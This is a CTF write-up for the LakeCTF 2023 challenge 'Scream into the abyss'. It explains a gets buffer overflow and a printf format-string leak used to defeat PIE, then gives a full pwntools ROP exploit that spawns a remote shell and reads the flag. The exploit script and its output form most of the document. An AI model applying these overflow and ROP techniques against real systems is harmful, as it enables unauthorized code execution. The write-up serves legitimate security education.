# 2023 LakeCTF - Scream into the abyss

We were given a binary that receives a `char` input:
```
$ ./abyss_scream 
Scream into the abyss and see how long it takes for you to get a response ;)Current iteration: 0
Enter input: 1
Current iteration: 1
Enter input: 2
Current iteration: 2
Enter input: 
```

Reverse engineering reveals a "special" char which executes a function where even more input can be written:
```
  printf("Scream into the abyss and see how long it takes for you to get a response ;)");
  do {
    while( true ) {
      printf("Current iteration: %d\n",(ulong)local_c);
      printf("Enter input: ");
      fflush(stdout);
      iVar1 = getchar();
      getchar();
      if ((char)iVar1 != 'x') break;
      save_msg(local_c);
      local_c = 0;
    }
    local_c = local_c + 1;
  } while( true );
```

In the `save_msg` function we see vulnerable `gets` call along with format string vulnerability `printf(local_118)`:
```
void save_msg(uint param_1)

{
  char local_118 [264];
  char *local_10;
  
  local_10 = (char *)calloc(8,1);
  printf("You can now scream a longer message but before you do so, we\'ll take your name: ");
  fflush(stdout);
  gets(local_10);
  printf("Saved score of %d for %s. Date and Time: ",(ulong)param_1,local_10);
  fflush(stdout);
  system("date");
  printf("Now please add a message: ");
  fflush(stdout);
  gets(local_118);
  puts("Your message:");
  printf(local_118);
  puts("");
  fflush(stdout);
  return;
}
```

The only complication with this challenge is that it has NX, PIE and Full RELRO:
```
pwndbg> checksec
[*] '/home/vm/Downloads/lakectf/abyss/abyss_scream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

This means that we need the following conditions satisfied for successful exploitation:
1. NX -> adequate ROP chain
2. PIE -> address leak

## Address leak

The address leak part is fairly simple since `save_msg` function contains a format string vulnerability:
```
$ ./abyss_scream 
Scream into the abyss and see how long it takes for you to get a response ;)Current iteration: 0
Enter input: x
You can now scream a longer message but before you do so, we'll take your name: my name
Saved score of 0 for my name. Date and Time: Sun Nov  5 08:43:10 PM CET 2023
Now please add a message: %lx%lx%lx%lx%lx%lx%lx%lx%lx
Your message:
117fda0f255140558dd6e516cc0588006c25786c25786c2525786c25786c2578
Current iteration: 0
Enter input: 
```

In gdb, there are useful things available on the stack:
```
22:0110│     0x7fffffffe020 —▸ 0x7fffffffe168 —▸ 0x7fffffffe447 ◂— '/home/vm/Downloads/lakectf/abyss/abyss_scream'
23:0118│     0x7fffffffe028 —▸ 0x555555559ac0 ◂— 0x656d616e20796d /* 'my name' */
24:0120│ rbp 0x7fffffffe030 —▸ 0x7fffffffe050 ◂— 0x1
25:0128│     0x7fffffffe038 —▸ 0x55555555539e (main+128) ◂— mov dword ptr [rbp - 4], 0
```

Around `rbp`, there are two interesting addresses to leak:
- "name" stored on the heap
- `main+128`

The `main+128` is interesting because we can leak the address of the `main` function and use the value further to calculate offsets of other functions which is leveraged in our ROP gadget. The "name" stored on the heap is another interesting thing since we can use it as a ready-made `"/bin/sh"` string for our `system` call - more on that later.

So the initial idea is as follows:
- scream a longer message and leak the heap address where we will store `/bin/sh`
- additionally leak `main+128` and calculate the address of `main`

## Building the ROP chain

Once we have the addresses leaked, we can easily build a ROP chain which jumps to `system`, since `system` is already used by the binary, so we will for sure find it in the `.plt.sec` region of the binary:
```
                             //
                             // .plt.sec 
                             // SHT_PROGBITS  [0x10b0 - 0x111f]
                             // ram:001010b0-ram:0010111f
                             //
...
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk int system(char * __command)
                               Thunked-Function: <EXTERNAL>::system
             int               EAX:4          <RETURN>
             char *            RDI:8          __command
                             <EXTERNAL>::system                              XREF[1]:     save_msg:0010129e(c)  
        001010c0 f3 0f 1e fa     ENDBR64
        001010c4 f2 ff 25        JMP        qword ptr [-><EXTERNAL>::system]                 int system(char * __command)
                 dd 2e 00 00
```

To make things even more easier, the binary offers us another function called `nothing_to_see_here` which aligns the stack for us:
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall nothing_to_see_here(void)
             undefined         AL:1           <RETURN>
                             nothing_to_see_here                             XREF[3]:     Entry Point(*), 00102170, 
                                                                                          00102244(*)  
        001013ad f3 0f 1e fa     ENDBR64
        001013b1 55              PUSH       RBP
        001013b2 48 89 e5        MOV        RBP,RSP
        001013b5 5f              POP        RDI
        001013b6 c3              RET
```

The only problem now is the `PUSH RBP` which will push the `rbp` value on to the stack and then pop it to `rdi`, but we also have a gadget for that as well:
```
0x00000000000011f3 : pop rbp ; ret
```

Now that we have all of the parts for our ROP chain, here is the draft of our complete exploit:
1. Scream a longer message (input 'x')
2. Input `/bin/sh` as your name
3. Use printf format string vuln to leak `/bin/sh` and `main` function address
4. Again input 'x' to scream a longer message
5. Overflow the stack and perform the following ROP chain
   - `pop rbp` address
   - `/bin/sh` value (will get popped into `rbp`)
   - `nothing_to_see_here` (pushes `/bin/sh` value from `rbp`, aligns stack, pops `/bin/sh` into `rdi`)
   - `system` function (`system("/bin/sh")`)

## Script

This is how the whole idea looks in a script:
```python3
import sys

from pwn import *

if len(sys.argv) == 1:
    r = process("./abyss_scream")
elif len(sys.argv) == 2:
    r = remote("chall.polygl0ts.ch", 9001)
else:
    r = gdb.debug("./abyss_scream", '''set follow-fork-mode parent
b main
continue
b save_msg
b *save_msg+154
b *save_msg+204
b nothing_to_see_here
continue
''')
print(r.recvuntil(b"Enter input: "))
r.sendline(b"x")
print(r.recvuntil(b"name: "))
r.sendline(b"/bin/sh")
print(r.recvuntil(b"message: "))

payload = b'.'.join([b"%lx" for i in range(44)])

r.sendline(payload)
print(r.readline())
dump = r.readline().split(b'.')
print(dump)
main128 = int(dump[-2], 16)
binsh = int(dump[-4], 16)
main = main128 - 128
nothing_to_see_here = main + 143
poprbp = nothing_to_see_here - 442
system = main - 606

print(r.recvuntil(b"Enter input: "))
r.sendline(b"x")
print(r.recvuntil(b"name: "))
r.sendline(b"/bin/sh")
print(r.recvuntil(b"message: "))

payload  = b"A" * 0x118
payload += p64(poprbp)
payload += p64(binsh)
payload += p64(nothing_to_see_here)
payload += p64(system)

r.sendline(payload)
r.interactive()
```

Executing the script towards the server renders the flag:
```
$ python3 xpl.py a
[+] Opening connection to chall.polygl0ts.ch on port 9001: Done
b'Scream into the abyss and see how long it takes for you to get a response ;)Current iteration: 0\nEnter input: '
b'Saved score of 0 for /bin/sh. Date and Time: Sun Nov  5 09:15:44 UTC 2023\nNow please add a message: '
b'Your message:\n'
[b'1', b'1', b'3a6567617373656d', b'7fe9b429ca70', b'0', b'3e8', b'0', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'2e786c252e786c25', b'786c252e786c25', b'55a03d50531e', b'55a03d507d90', b'7fe9b42e7040', b'7fe9b429aaa0', b'7fe9b4297600', b'7ffca40d70c8', b'55a03d50531e', b'55a03d507d90', b'7fe9b42e7040', b'7fe9b410ed96', b'0', b'55a03e2f12c0', b'7ffca40d6fb0', b'55a03d50539e', b'1000\n']
b'Current iteration: 0\nEnter input: '
b"You can now scream a longer message but before you do so, we'll take your name: "
b'Saved score of 0 for /bin/sh. Date and Time: Sun Nov  5 09:15:44 UTC 2023\nNow please add a message: '
[*] Switching to interactive mode
Your message:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf3QP=\xa0U
$ id
uid=1000(jail) gid=1000(jail) groups=1000(jail)
$ ls
flag.txt
run
$ cat flag.txt
EPFL{H3Y_C4LM_D0WN_N0_N33D_T0_SCR34M_S0_L0UD_1_C4N_H34R_Y0U!!!!!!}[*] Got EOF while reading in interactive
```
